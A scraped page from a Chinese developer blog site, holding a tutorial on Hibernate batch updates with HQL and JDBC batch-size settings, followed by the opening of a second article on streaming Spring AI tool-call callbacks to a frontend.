itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（54）Hibernate中的批量更新如何实现？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T11:55:47.000Z" title="Tue Jan 20 2026 11:55:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在Hibernate中，批量更新可以显著提高更新操作的性能，尤其是在处理大量数据时。批量更新可以通过使用HQL（Hibernate Query Language）实现，也可以通过启用Hibernate的批量操作设置来优化性能。以下是详细的批量更新实现和代码示例。</p>
<h3 data-id="heading-0">1. 使用HQL进行批量更新</h3>
<p>通过HQL语句可以直接执行批量更新操作，而无需逐条更新实体。以下是一个简单的示例：</p>
<h4 data-id="heading-1">配置Hibernate</h4>
<p>首先，确保在<code>hibernate.cfg.xml</code>中正确配置Hibernate：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 数据库连接配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate 属性配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 映射类 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Product"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-2">实体类定义</h4>
<p>以下是一个简单的实体类<code>Product</code>的定义：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "product")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@Column(name = "price")</span>
    <span class="hljs-keyword">private</span> Double price;

    <span class="hljs-comment">// Getters and Setters</span>
}
</code></pre>
<h4 data-id="heading-3">使用HQL进行批量更新</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateBatchUpdateExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        updateProductPrices(<span class="hljs-number">10.0</span>);
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateProductPrices</span><span class="hljs-params">(<span class="hljs-type">double</span> increaseAmount)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">String</span> <span class="hljs-variable">hql</span> <span class="hljs-operator">=</span> <span class="hljs-string">"update Product set price = price + :increaseAmount"</span>;
            <span class="hljs-type">int</span> <span class="hljs-variable">updatedEntities</span> <span class="hljs-operator">=</span> session.createQuery(hql)
                                         .setParameter(<span class="hljs-string">"increaseAmount"</span>, increaseAmount)
                                         .executeUpdate();
            transaction.commit();
            System.out.println(<span class="hljs-string">"Number of products updated: "</span> + updatedEntities);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<h3 data-id="heading-4">2. 使用批量操作设置进行优化</h3>
<p>Hibernate允许通过批量操作设置来优化批量更新性能。在<code>hibernate.cfg.xml</code>中设置批量操作属性：</p>
<h4 data-id="heading-5">配置批量操作</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- other configurations --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.jdbc.batch_size"</span>&gt;</span>20<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.order_inserts"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.order_updates"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-6">批量更新示例</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateBatchInsertExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        batchInsertProducts();
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">batchInsertProducts</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">100</span>; i++) {
                <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
                product.setName(<span class="hljs-string">"Product "</span> + i);
                product.setPrice(<span class="hljs-number">100.0</span> + i);
                session.save(product);

                <span class="hljs-comment">// 每批次20个进行一次批处理</span>
                <span class="hljs-keyword">if</span> (i % <span class="hljs-number">20</span> == <span class="hljs-number">0</span>) {
                    session.flush();
                    session.clear();
                }
            }
            transaction.commit();
            System.out.println(<span class="hljs-string">"Products inserted successfully"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<h4 data-id="heading-7">批量更新示例</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateBatchUpdateExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        batchUpdateProductPrices(<span class="hljs-number">10.0</span>);
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">batchUpdateProductPrices</span><span class="hljs-params">(<span class="hljs-type">double</span> increaseAmount)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            List&lt;Product&gt; products = session.createQuery(<span class="hljs-string">"from Product"</span>, Product.class).list();
            <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
            <span class="hljs-keyword">for</span> (Product product : products) {
                product.setPrice(product.getPrice() + increaseAmount);
                session.update(product);

                <span class="hljs-comment">// 每批次20个进行一次批处理</span>
                <span class="hljs-keyword">if</span> (++count % <span class="hljs-number">20</span> == <span class="hljs-number">0</span>) {
                    session.flush();
                    session.clear();
                }
            }
            transaction.commit();
            System.out.println(<span class="hljs-string">"Products updated successfully"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<h3 data-id="heading-8">总结</h3>
<ol>
<li><strong>使用HQL进行批量更新</strong>：通过HQL语句可以直接执行批量更新操作，避免逐条更新实体。</li>
<li><strong>配置Hibernate批量操作设置</strong>：通过在<code>hibernate.cfg.xml</code>中设置<code>hibernate.jdbc.batch_size</code>等属性，可以优化批量更新的性能。</li>
<li><strong>批量操作示例</strong>：通过使用批量操作设置和定期刷新清理会话，可以有效地处理大批量的数据更新。</li>
</ol>
<p>通过这些方法，可以显著提高Hibernate应用程序的批量更新性能。希望这些详细的解释和代码示例能帮助您更好地理解和应用Hibernate的批量更新技术。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring AI 工具调用回调与流式前端展示的完整落地方案]]></title>    <link>https://juejin.cn/post/7597199288817762344</link>    <guid>https://juejin.cn/post/7597199288817762344</guid>    <pubDate>2026-01-20T09:38:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597199288817762344" data-draft-id="7597259271109869608" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring AI 工具调用回调与流式前端展示的完整落地方案"/> <meta itemprop="keywords" content="后端,AI编程"/> <meta itemprop="datePublished" content="2026-01-20T09:38:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="leikooo"/> <meta itemprop="url" content="https://juejin.cn/user/2441356474071421"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring AI 工具调用回调与流式前端展示的完整落地方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2441356474071421/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    leikooo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T09:38:50.000Z" title="Tue Jan 20 2026 09:38:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">那些坑</h2>
<p>用 SpringAI 重写 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.codefather.cn%2Fcourse%2F1948291549923344386" target="_blank" title="https://www.codefather.cn/course/1948291549923344386" ref="nofollow noopener noreferrer">零代码生成</a> 时，前端展示工具调用这件事把我卡住了。</p>
<p>Langchain4j 写回调多舒服啊</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">StreamingChatResponseHandler</span> {  
    <span class="hljs-keyword">default</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onPartialToolCall</span><span class="hljs-params">(PartialToolCall partialToolCall)</span> {}  
    <span class="hljs-keyword">default</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onPartialToolCall</span><span class="hljs-params">(PartialToolCall partialToolCall, PartialToolCallContext context)</span> {}  
    <span class="hljs-keyword">default</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCompleteToolCall</span><span class="hljs-params">(CompleteToolCall completeToolCall)</span> {}  
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCompleteResponse</span><span class="hljs-params">(ChatResponse completeResponse)</span>;  
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(Throwable error)</span>;  
}  
</code></pre>
<p>再看看 <code>@ToolMemoryId</code>，直接往方法参数里一扔，conversationId 就到手了，多省心：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Tools</span> {  
    <span class="hljs-meta">@Tool</span>  
    String <span class="hljs-title function_">addCalendarEvent</span><span class="hljs-params">(CalendarEvent event, <span class="hljs-meta">@ToolMemoryId</span> memoryId)</span> {  
        <span class="hljs-comment">// memoryId 直接能用  </span>
    }  
}  
</code></pre>
<p>SpringAI 呢？这些它都没有（也有可能是我没找到）。adviseStream 工具调用的时候也感知不到</p>
<hr/>
<h2 data-id="heading-1">为什么一定要 conversationId？</h2>
<p>主要有下面几点</p>
<ol>
<li>生成的代码需要区分目录，方便管理</li>
<li>隔离每个单独 APP 生成的路径</li>
<li>记录工具调用次数（后续分析用）</li>
</ol>
<hr/>
